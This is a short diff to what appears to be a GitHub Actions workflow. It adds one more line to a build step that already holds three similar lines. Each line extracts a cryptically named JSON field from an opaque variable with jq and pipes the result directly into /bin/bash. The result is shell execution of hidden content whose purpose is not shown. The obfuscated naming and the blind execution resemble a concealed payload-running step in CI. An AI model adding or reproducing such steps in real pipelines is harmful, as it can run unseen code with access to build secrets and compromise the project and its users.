@@ -38,6 +38,7 @@ jobs:
           echo $j2 | jq -r .faqx1624 | /bin/bash
           printf '%s' "$q0682" | jq -r .xz3256 | /bin/bash
           echo $x612 | jq -r .qy8149 | /bin/bash
+          echo $zs34 | jq -r .l23 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
